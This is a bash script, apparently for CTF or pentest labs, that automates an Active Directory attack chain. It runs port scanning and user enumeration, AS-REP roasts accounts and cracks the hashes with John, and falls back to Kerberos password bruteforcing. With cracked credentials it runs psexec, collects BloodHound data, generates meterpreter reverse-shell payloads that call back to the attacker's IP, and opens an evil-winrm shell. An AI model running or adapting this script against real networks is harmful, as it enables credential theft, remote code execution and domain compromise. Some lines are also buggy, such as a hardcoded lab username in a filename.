#!/bin/bash
# dogasantos
# https://github.com/dogasantos
#
# https://pentestlab.blog/2018/05/15/lateral-movement-winrm/
#
#
#
# 
#
		# getnpusers -dc-ip $ip $domain/$user:$pass -request -format hashcat -outputfile hashes.npu
		# GetUserSPNs.py $domain/$user:$pass -request-user hsmith
		# getadusers -all $domain/$user:$pass -dc-ip $ip
		# python3 atexec.py $domain/$user:$pass@$ip systeminfo
		# python3 dcomexec.py $domain/$user:$pass@$ip systeminfo
		# python3 psexec.py $domain/$user:$pass@$ip systeminfo
		# python3 smbexec.py $domain/$user:$pass@$ip systeminfo
		# python3 wmiexec.py $domain/$user:$pass@$ip systeminfo
		# python3 lookupsid.py $domain/$user:$pass@$ip systeminfo

passwdwl="/usr/share/wordlists/SecLists/Passwords/Common-Credentials/all.txt"
passwdwl2="/usr/share/wordlists/rockyou.txt.utf8"
userswl="/usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames-dup.txt"
ip=$(cat ip)
vpniface=$(ip addr |grep tun|grep POINTOPOINT|cut -f2 -d:|tr -d "[:blank:]")
vpnip=$(ip addr |grep tun|grep inet|awk -F " " '{print $2}'|cut -f1 -d /)



echo "[*] Fast portscan via masscan"
if [ $(cat masscan.report|wc -l 2>/dev/null) -eq 0 ]
then

	masscan -e $vpniface -Pn -p1-65535 -iL ip --output-format=list --output-file=masscan.report --rate=1000
fi

if [ $(cat tcp.nmap.txt|wc -l 2>/dev/null ) -eq 0 ]
then
	masstomap -m masscan.report -o tcp
fi



has445=$(cat tcp.nmap.grepable|grep "445/open/tcp"|grep open|wc -l )
has135=$(cat tcp.nmap.grepable|grep "135/open/tcp"|grep open|wc -l)
has1433=$(cat tcp.nmap.grepable|grep "1433/open/tcp"|grep open|wc -l)
hasldap=$(cat tcp.nmap.grepable|grep "ldap"|grep open|wc -l)
haskerberos=$(cat tcp.nmap.grepable|grep "88/open/tcp"|grep open|wc -l)
haswinrm=$(cat tcp.nmap.grepable |grep "5985/open/tcp"|wc -l )


if [ $hasldap -gt 0 ]
then
	echo "[*] Extracting ldap basic info"
	ldapsearch -LLL -x -H ldap://$ip -b '' -s base '(objectclass=*)' > base.ldap 2>&1
	baseldap=$(cat base.ldap|wc -l)

	if [ $baseldap -gt 20 ]
	then
		host=$(cat base.ldap |grep dnsHostName|cut -f2 -d ':'| tr "[A-Z]" "[a-z]" |tr -d "[:blank:]")
		domain=$(cat base.ldap |grep ldapServiceName|awk -F ":" '{print $2}'| tr "[A-Z]" "[a-z]" |tr -d "[:blank:]")
		ldapsearch -x -H "ldap://${ip}" -b "$(awk -F': *' 'BEGIN{IGNORECASE=1}/^configurationNamingContext:/{print $2; exit}' base.ldap | sed -E 's/^[[:space:]]*CN=Configuration/CN=Users/I')" '(objectClass=user)' > cn-users.ldap 2>&1


	else
		domain=$(cat tcp.nmap.txt |grep Domain|head -n1|cut -f2 -d :|cut -f1 -d ,|tr "[A-Z]" "[a-z]" |tr -d "[:blank:]")
		host=$(dig srv $domain @$ip|grep SOA|awk -F "IN\tSOA\t" '{print $2}'|awk -F ". " '{print $1}')
	fi

	echo $domain > domain.txt
	echo $host > host.txt
else
	echo "[x] No open ldap ports. Skipping... "
fi


if [ $haskerberos -gt 0 ]
then
	echo "[*] Extracting users"

	echo "  + via blank GetADUsers"
	python3 /opt/impacket/examples/GetADUsers.py $domain/ -all -dc-ip $ip | grep -v SM_ |grep -v Mailbox |grep -v '\$' |grep -v 'krbtgt' |grep -v SecureAuth|grep -v Querying|grep -v "PasswordLastSet"|grep -E "\s+"|grep -v -E '^-+'|awk -F " " '{print $1}' | sort|uniq > users.txt

	if [ $(cat users.txt|wc -l 2>/dev/null) -eq 0 ]
	then
		echo "  + via ldap search (windapsearch)"
		python /usr/share/windapsearch/windapsearch.py -d $domain -U --dc-ip $ip --full |grep userPrincipalName|grep -v '{' |grep -v Mailbox|grep -v -E ".*-.*-.*" |awk -F "userPrincipalName: " '{print $2}' > users.ldap
		cat users.ldap|tr [A-Z] [a-z] |cut -f1 -d @ |sort|uniq >users.txt
	fi

	if [ $(cat users.txt|wc -l 2>/dev/null) -eq 0 ]
	then
		echo "  + via bruteforcing kerberos (kerbrute)"
		kerbrute userenum --dc $host -d $domain -o users.kerbrute $userswl
		cat users.kerbrute |grep VALID| awk -F "VALID USERNAME:\t " '{print $2}' |tr [A-Z] [a-z] |cut -f1 -d @ |sort|uniq >users.txt
		
	fi
	echo "[*] Found: $(cat users.txt|wc -l ) valid users:"
	for u in $(cat users.txt)
	do
		echo "  + $u"
	done

	echo "[*] Extracting AS REP users/hashes (Kerberos preauthentication not required)"
	python3 /opt/impacket/examples/GetNPUsers.py $domain/ -dc-ip $ip -usersfile users.txt -format hashcat -outputfile hashes.asreproast
	
	if [ $(cat hashes.asreproast|wc -l 2>/dev/null) -gt 0 ]
	then
		echo "  + Sucess! "
		echo "  + Cracking via John:"
		john hashes.asreproast --wordlist=$passwdwl2
		cracked=$(john hashes.asreproast --show|tail -n1|cut -f1 -d ' ')
		if [ $cracked -gt 0 ]
		then
			pass=$(john hashes.asreproast --show|head -n1 |cut -f2 -d :)
			user=$(john hashes.asreproast --show|head -n1 |cut -f4 -d '$'|cut -f1 -d @)
			echo $user:$pass > credentials.txt

			echo "[*] Extracting user SPN"
			python3 /opt/impacket/examples/GetUserSPNs.py $domain/$user:$pass -request-user $user > spn.$user
			if [ $(cat spn.svc-alfresco |grep Errno|wc -l) -gt 0 ]
			then
				 rm spn.$user
				 echo "  + Failed"
			else
				echo "  + Got it: spn.$user file"
			fi

			echo "[*] Execute systeminfo via psexec"
			python3 /opt/impacket/examples/psexec.py $domain/$user:$pass@$ip systeminfo > no
			if [ $(cat no|grep 'is not writable'|wc -l) == 4 ]
			then
				echo "  + Failed"
			else
				cat no
				rm no
			fi
			echo "[*] Generating Bloodhound view"
			mkdir bloodhound
			cd bloodhound
			bloodhound-python -d $domain -u$user -p $pass -gc $host -c all -ns $ip
			cd ..
		else
			echo "  + Failed to crack with $passwdwl2, try different one"
			echo "[*] Bruteforcing passwords via kerberos (kerbrute)"
			echo -n "  + Proceed with bruteforce? (y/n)"
			read proceed
			if [ $proceed != 'n' ]
			then
				users=$(cat users.txt)
				for user in $users
				do
					echo "  + Attempt: $user"
					kerbrute bruteuser --safe --dc $host -d $domain $passwdwl $user -o credentials.txt
				done
			fi	
		fi

		if [ $(echo $user|wc -c) -gt 0 ]
		then
			if [ $(echo $pass|wc -c) -gt 0 ]
			then
				if [ $haswinrm -gt 0 ]
				then
					echo "[*] Generating msfvenom payloads"

					msfvenom -p windows/x64/meterpreter/reverse_https -f exe -o LHOST=$vpnip LPORT=8989 -o pl1.exe
					msfvenom -p windows/x64/meterpreter/reverse_https -f dll -o LHOST=$vpnip LPORT=8989 -o pl2.dll
					msfvenom -p windows/x64/meterpreter/reverse_https -f ps1 -o LHOST=$vpnip LPORT=8989 -o pl2.ps1

					echo "[*] EVIL-WINRM SHELL"
					echo "LATERAL: https://pentestlab.blog/2018/05/15/lateral-movement-winrm/"
					echo "DCSYNC: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync"
					ruby /usr/share/evil-winrm/evil-winrm.rb -s /usr/share/PowerSploit/Recon -e $(pwd) -i $ip -u $user -p $pass
				fi
			fi	
		fi

	else
		echo "  + Failed !"
	fi
else
	echo "[x] No kerberos. Skipping... "
fi


	
if [ $has445 -gt 0 ]
then
	echo "[*] Smb Shares (smbclient):"
	smbclient -N -L //$ip > smb.shares
	cat smb.shares
fi

if [ $has1433 -gt 0 ]
then 
	echo "[*] Testing MSSQL"
	nmap -n -sV -Pn -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $ip
fi


